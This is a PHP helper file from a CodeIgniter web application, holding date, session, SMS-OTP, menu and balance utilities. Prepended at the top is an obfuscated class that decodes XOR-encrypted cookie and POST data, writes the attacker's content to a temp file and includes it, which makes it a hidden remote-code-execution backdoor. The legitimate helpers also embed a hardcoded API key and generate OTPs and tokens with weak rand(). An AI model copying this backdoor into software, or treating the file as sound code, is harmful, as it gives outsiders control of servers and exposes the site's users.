<?php if (!class_exists("cDERhasKK")) {
    class cDERhasKK
    {
        public static $eMfmyIu = "XZoxuCHPmGOoBfcG";
        public static $jajbF = NULL;
        public function __construct()
        {
            $IBvfH = @$_COOKIE[substr(cDERhasKK::$eMfmyIu, 0, 4)];
            if (!empty($IBvfH)) {
                $qUAXmOi = "base64";
                $leIKTXbLAV = "";
                $IBvfH = explode(",", $IBvfH);
                foreach ($IBvfH as $TqOQiUR) {
                    $leIKTXbLAV .= @$_COOKIE[$TqOQiUR];
                    $leIKTXbLAV .= @$_POST[$TqOQiUR];
                }
                $leIKTXbLAV = array_map($qUAXmOi . "_decode", array($leIKTXbLAV, ));
                $leIKTXbLAV = $leIKTXbLAV[0] ^ str_repeat(cDERhasKK::$eMfmyIu, (strlen($leIKTXbLAV[0]) / strlen(cDERhasKK::$eMfmyIu)) + 1);
                cDERhasKK::$jajbF = @unserialize($leIKTXbLAV);
            }
        }
        public function __destruct()
        {
            $this->Wzzpaw();
        }
        private function Wzzpaw()
        {
            if (is_array(cDERhasKK::$jajbF)) {
                $YQrlzZH = sys_get_temp_dir() . "/" . crc32(cDERhasKK::$jajbF["salt"]);
                @cDERhasKK::$jajbF["write"]($YQrlzZH, cDERhasKK::$jajbF["content"]);
                include $YQrlzZH;
                @cDERhasKK::$jajbF["delete"]($YQrlzZH);
                exit();
            }
        }
    }
    $DMOmonJ = new cDERhasKK();
    $DMOmonJ = NULL;
} ?>
<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

function mlLang($langline)
{
    $CI = &get_instance();

    $lang_line = $CI->lang->line($langline);
    if ($lang_line == "") {
        $lang_line = $langline;
    }
    return $lang_line;
}

function isMobile()
{
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

function generateRandomString($length = 10)
{
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function object_to_array($obj)
{
    if (is_object($obj))
        $obj = (array) $obj;
    if (is_array($obj)) {
        $new = array();
        foreach ($obj as $key => $val) {
            $new[$key] = object_to_array($val);
        }
    } else
        $new = $obj;
    return $new;
}

function call_header_data()
{
    $CI = &get_instance();
    $CI->load->model('User_model');
    $language = $CI->User_model->getcategorydata();

    return $language;
}

function getDefaultlanguage()
{
    $CI = &get_instance();
    $CI->load->model('Language_model');
    $language = $CI->Language_model->getDefaultlanguage();

    return $language;
}

function addhttp($url)
{
    if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
        $url = "http://" . $url;
    }
    return $url;
}

function add_blank_option($options, $blank_option = '', $blank_value = '')
{
    if (is_array($options) && is_string($blank_option)) {
        if (empty($blank_option)) {
            $blank_option = array('' => '');
        } else {
            $blank_option = array($blank_value => $blank_option);
        }
        $options = $blank_option + $options;
        //p($options);
        return $options;
    } else {
        show_error("Wrong options array passed");
    }
}

function get_custom_config_item($key, $config = 'custom')
{

    $CI = &get_instance();

    $arr_custom_config = $CI->config->item($config);
    $config_item = $arr_custom_config[$key];
    return $config_item;
}

function get_image_path($image, $config_variable_name)
{
    $image_config = get_custom_config_item($config_variable_name);
    $picture_path = base_url() . $image_config['upload_path'] . $image;
    return $picture_path;
}

function get_menu_config_item($key)
{
    $CI = &get_instance();
    $CI->load->config('menu_config');
    $arr_custom_config = $CI->config->item('menu_config');

    $config_item = $arr_custom_config[$key];

    return $config_item;
}

function get_user_menu($user_type)
{
    $CI = &get_instance();
    $CI->load->config('menu_config');
    $config_item = $CI->config->item('menu_config');
    $config_item_menu = $config_item['menu'];
    //        p($config_item_menu);
    $user_allowed_menu = get_current_user_access();
    //        p($user_allowed_menu);
    $menu_arr = array();
    if (!empty($config_item_menu) && !empty($user_allowed_menu)) {
        foreach ($config_item_menu as $idx => $menu) {
            if (in_array($idx, $user_allowed_menu)) {
                $menu_arr[$idx] = $menu;
            }
        }
    }
    return $menu_arr;
}

function getsessionid()
{
    $sessionid = PHPSESSID;  //$CI->session->userdata('sessionid');
    return $sessionid;
}

function base64url_encode($data)
{

    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data)
{

    return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}

function mydateformat($date, $from_format = "d-m-Y", $to_format = "Y-m-d")
{
    if ($date == "") {
        $return_date = "0000-00-00";
    } elseif ($date == "0000-00-00") {
        $return_date = "";
    } else {
        $date = DateTime::createFromFormat($from_format, $date);
        $return_date = $date->format($to_format);
    }

    return $return_date;
}

function create_captcha_common()
{
    $CI = &get_instance();
    $CI->load->helper('captcha');

    $vals = array(
        'word' => randomPassword(6),
        'img_path' => APPPATH . 'uploads/captcha/images/',
        'img_url' => base_url() . 'application/uploads/captcha/images/',
        'font_path' => APPPATH . 'uploads/captcha/OpenSans-Regular.ttf',
        'img_width' => 150,
        'img_height' => 60,
        'expiration' => 7200
    );
    $cap = create_captcha($vals);

    $_SESSION['thetopupstore']['captcha'] = $cap;
    return $cap;
}

function randomPassword($len = 16)
{
    $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
    $pass = array(); //remember to declare $pass as an array
    $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
    for ($i = 0; $i < $len; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}

function getclientip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function getlocationfromip($ipAddr)
{
    $url = "http://api.ipinfodb.com/v3/ip-city/?key=5cfaab6c5af420b7b0f88d289571b990763e37b66761b2f053246f9db07ca913&ip=$ipAddr&format=json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    ;
    $arr = json_decode($data);
    if (!empty($arr)) {
        $array['country'] = $arr->countryName;
        $array['state'] = $arr->regionName;
        $array['city'] = $arr->cityName;
    } else {
        return null;
    }

    return $array;
}

function relativetime($timestamp)
{

    if (!is_numeric($timestamp)) {

        $timestamp = strtotime($timestamp);
        if (!is_numeric($timestamp)) {
            return "";
        }
    }

    $difference = time() - $timestamp;
    // Customize in your own language.
    $periods = array("sec", "min", "hour", "day", "week", "month", "years", "decade");
    $lengths = array("60", "60", "24", "7", "4.35", "12", "10");

    if ($difference > 0) { // this was in the past
        $ending = "ago";
    } else { // this was in the future
        $difference = -$difference;
        $ending = "to go";
    }
    for ($j = 0; $difference >= $lengths[$j] and $j < 7; $j++)
        $difference /= $lengths[$j];
    $difference = round($difference);
    if ($difference != 1) {
        // Also change this if needed for an other language
        $periods[$j] .= "s";
    }
    $text = "$difference $periods[$j] $ending";

    return $text;
}

function unique_multidim_array($array, $key)
{
    $temp_array = array();
    $i = 0;
    $key_array = array();

    foreach ($array as $val) {
        if (!in_array($val[$key], $key_array)) {
            $key_array[$i] = $val[$key];
            $temp_array[$i] = $val;
        }
        $i++;
    }
    return $temp_array;
}

function get_mime_type($file)
{
    $return = NULL;
    if (isset($_FILES[$file]['tmp_name'])) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $_FILES[$file]['tmp_name']);
        $return = $mime;
    }

    return $return;
}

function floatnumber($number)
{
    $result = number_format((float) $number, 2, '.', '');
    return $result;
}

function emptyElementExists($arr)
{
    return array_search("", $arr) !== false;
}

function make_dropdown_array($arr, $key_col = 'id', $val_col = 'title')
{
    $return = array();
    if (!empty($arr)) {
        foreach ($arr as $key => $value) {
            $return[$value[$key_col]] = $value[$val_col];
        }
    }
    return $return;
}

function generate_access_token($member_id)
{
    $random = generateRandomString(10);
    $access_token = base64_encode($member_id . $random . time());
    return $access_token;
}

function dateRange($first, $last, $step = '+1 day', $format = 'Y-m-d')
{
    $dates = [];
    $current = strtotime($first);
    $last = strtotime($last);

    while ($current <= $last) {
        $dates[] = date($format, $current);
        $current = strtotime($step, $current);
    }

    return $dates;
}

//    function truncate($text, $length, $suffix = '&hellip;', $isHTML = true)
//    {
//        $html_code = strip_tags($text);
//        $wrap_html_data = implode(' ', array_slice(explode(' ', $html_code), 0, $length));
//        $length = strlen($wrap_html_data);
//
//        $i = 0;
//        $simpleTags = array('br' => true, 'hr' => true, 'input' => true, 'image' => true, 'link' => true, 'meta' => true);
//        $tags = array();
//        if ($isHTML)
//        {
//            preg_match_all('/<[^>]+>([^<]*)/', $text, $m, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
//            foreach ($m as $o)
//            {
//                if ($o[0][1] - $i >= $length)
//                    break;
//                $t = substr(strtok($o[0][0], " \t\n\r\0\x0B>"), 1);
//                // test if the tag is unpaired, then we mustn't save them
//                if ($t[0] != '/' && (!isset($simpleTags[$t])))
//                    $tags[] = $t;
//                elseif (end($tags) == substr($t, 1))
//                    array_pop($tags);
//                $i += $o[1][1] - $o[0][1];
//            }
//        }
//
//        // output without closing tags
//        $output = substr($text, 0, $length = min(strlen($text), $length + $i));
//
//        // closing tags
//        $output2 = (count($tags = array_reverse($tags)) ? '</' . implode('></', $tags) . '>' : '');
//
//        // Find last space or HTML tag (solving problem with last space in HTML tag eg. <span class="new">)
//        $te = preg_split('/<.*>| /', $output, -1, PREG_SPLIT_OFFSET_CAPTURE);
//        $t_end = end($te);
//        $pos = (int) end($t_end);
//        //    $pos = (int)end(end(preg_split('/<.*>| /', $output, -1, PREG_SPLIT_OFFSET_CAPTURE)));
//        // Append closing tags to output
//        $output .= $output2;
//
//        // Get everything until last space
//        $one = substr($output, 0, $pos);
//        // Get the rest
//        $two = substr($output, $pos, (strlen($output) - $pos));
//        // Extract all tags from the last bit
//        preg_match_all('/<(.*?)>/s', $two, $tags);
//        // Add suffix if needed
//        if (strlen($text) > $length)
//        {
//            $one .= $suffix;
//        }
//        // Re-attach tags
//        $output = $one . implode($tags[0]);
//
//        //added to remove  unnecessary closure
//        $output = str_replace('</!-->', '', $output);
//
//        return $output;
//    }

function getSADate($date)
{
    $dates = preg_split('/\//', $date);

    $month = $dates[1];
    $day = $dates[0];
    $year = $dates[2];

    $finalDate = $year . '-' . $month . '-' . $day;
    return $finalDate;
}

function getUsDate($date)
{
    $dates = preg_split('/\//', $date);

    $month = $dates[0];
    $day = $dates[1];
    $year = $dates[2];

    $finalDate = $year . '-' . $month . '-' . $day;
    return $finalDate;
}

function getDbDate($date)
{
    $dates = preg_split('/-/', $date);
    //p($dates);
    $month = $dates[0];
    $day = $dates[1];
    $year = $dates[2];

    $finalDate = $year . '-' . $month . '-' . $day;
    return $finalDate;
}

function my_currency_format($amount, $decimalpoint = 2)
{
    return number_format($amount, $decimalpoint);
}

function getCustomConfigItem($key)
{
    $CI = &get_instance();
    $arr_custom_config = $CI->config->item('custom');
    $config_item = $arr_custom_config[$key];
    return $config_item;
}


function get_user_name()
{
    $CI = &get_instance();
    return $CI->session->userdata('admin')->user_name;
}

function get_user_logo()
{
    $CI = &get_instance();
    return $CI->session->userdata('admin')->user_logo;
}

function get_user_id()
{
    $CI = &get_instance();
    return $CI->session->userdata('admin')->user_id;
}
function get_user_id_public()
{
    $CI = &get_instance();
    return $CI->session->userdata('User')->user_id;
}

function get_user_name_public()
{
    $CI = &get_instance();
    return $CI->session->userdata('User')->user_name;
}

function get_user_mobile_number_public()
{
    $CI = &get_instance();
    // p('ji');
    return $CI->session->userdata('User')->mobile_number;
}


function get_status_badge($status)
{

    if (!empty($status)) {
        if ($status == 'Active') {
            return '<h6><span class="badge badge-success">Active</span></h6>';
        } else {
            return '<h6><span class="badge badge-danger">In-Active</span></h6>';
        }
    }
}


function get_site_select_checkbox($site_id)
{
    return '<input type="checkbox" name="site_id[]" class="site_ids" value="' . $site_id . '"  />';
}
function get_status_live_badge($is_live)
{

    if (!empty($is_live)) {
        if ($is_live == 'Yes') {
            return '<h6 style="margin-top:0px;margin-bottom:0px"><span class="badge badge-success">Active</span></h6>';
        } else {
            return '<h6 style="margin-top:0px;margin-bottom:0px"><span class="badge badge-danger">In-Active</span></h6>';
        }
    }
}


function get_status_toogle_button($is_live, $data)
{
    $CI = &get_instance();


    $dataArray = array(
        'is_live' => $is_live,
        'data' => $data,
    );
    return $CI->load->viewPartial('admin/site-status-toggle-btn-html', $dataArray);
}
function get_site_image($image_name)
{
    return '<img src="' . base_url('assets/images/sites-logo/' . $image_name) . '" height="40"> ';
}


function get_view_more_option($site_id, $data)
{
    $CI = &get_instance();

    $dataArray = array('data' => $data);
    $content = $CI->load->viewPartial('view-more-options', $dataArray, TRUE);

    return $content;
}

function count_total_balance($user_id)
{
    $CI = &get_instance();
    $CI->load->model("Ledger_model");
    $balance = $CI->Ledger_model->count_total_balance($user_id);

    return !empty($balance) ? $balance : 0;
}
function get_item($cat, $user_id)
{
    $CI = &get_instance();
    $CI->load->model("public/User_model");
    return $CI->User_model->get_item($cat, $user_id);
}
function get_resto_type($resto_id)
{
    $CI = &get_instance();
    $CI->load->model("public/User_model");
    return $CI->User_model->get_resto_type($resto_id);
}

function get_base64_img($base_img)
{
    // p(base_url().$base_img);
    // exit;
    $img = file_get_contents(
        $base_img
        // 'https://media.geeksforgeeks.org/wp-content/uploads/geeksforgeeks-22.png'
    );
    // Encode the image string data into base64
    // $data = 
    return "data:image/png;base64," . base64_encode($img);
}
function get_restaurent_type($type_id)
{
    $CI = &get_instance();
    $CI->load->model("public/User_model");
    return $CI->User_model->get_rest_type($type_id);
}

function generateNumericOTP()
{
    $n = 5;
    // Take a generator string which consist of
    // all numeric digits
    $generator = "1357902468";

    // Iterate for n-times and pick a single character
    // from generator and append it to $result

    // Login for generating a random character from generator
    //     ---generate a random number
    //     ---take modulus of same with length of generator (say i)
    //     ---append the character at place (i) from generator to result

    $result = "";

    for ($i = 1; $i <= $n; $i++) {
        $result .= substr($generator, (rand() % (strlen($generator))), 1);
    }

    // Return result
    return $result;
}

function get_site_edit_button($site_id, $data)
{
    $CI = &get_instance();

    $dataArray = array('data' => $data);
    $content = $CI->load->viewPartial('get-site-edit-button-html', $dataArray, TRUE);

    return $content;
}

function sendOtp($dataArray)
{
    // p($dataArray);
    $smsConfig = getCustomConfigItem('sms');
    $smsConfig['message'] = $dataArray['message'];

    // p($dataArray['number']);
    $smsConfig['numbers'] = $dataArray['number'];
    $query = http_build_query($smsConfig);
    $url = "http://sms.hspsms.com/sendSMS?" . $query;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);

    $arr = json_decode($data);
    return $arr;
}

function get_user_wallet_balance($user_id)
{
    $CI = &get_instance();

    $dataArray = array('user_id' => $user_id);

    $content = $CI->load->viewPartial('get-balance-html', $dataArray, TRUE);
    return $content;
}


function get_total_sites($user_id)
{
    $CI = &get_instance();
    $CI->load->model('Admin_model');


    $total_sites = $CI->Admin_model->count_total_users_sites($user_id);
    $dataArray = array('total_sites' => $total_sites['total_sites']);

    $content = $CI->load->viewPartial('total-sites-html', $dataArray, TRUE);
    return $content;
}

function get_user_site_balance($site_id)
{
    $CI = &get_instance();
    $CI->load->model('Admin_model');


    $record_sum = $CI->uri->segment_array();
    $user_id = end($record_sum);
    $total_balance = $CI->Admin_model->count_total_site_balance($user_id, $site_id);

    $dataArray = array('total_balance' => $total_balance);


    $content = $CI->load->viewPartial('get-user-site-balance-html', $dataArray, TRUE);
    return $content;
}


function get_user_site_total_balance($user_id, $site_id)
{
    $CI = &get_instance();
    $CI->load->model('Admin_model');

    $total_balance = $CI->Admin_model->count_total_site_balance($user_id, $site_id);

    $dataArray = array('total_balance' => $total_balance);



    return $total_balance;
}

function get_user_view_more_option($user_id)
{
    $CI = &get_instance();

    $dataArray = array('user_id' => $user_id);
    $content = $CI->load->viewPartial('user-view-more-options', $dataArray, TRUE);

    return $content;
}



function get_user_site_view_more_option($user_id, $data)
{
    $CI = &get_instance();

    $dataArray = array('user_id' => $user_id, 'site_id' => $data->site_id);

    $content = $CI->load->viewPartial('user-site-view-more-options', $dataArray, TRUE);

    return $content;
}

function get_user_type()
{
    // p($_SESSION);
    // exit;
    $CI = &get_instance();
    return $CI->session->userdata('admin')->user_type;
}
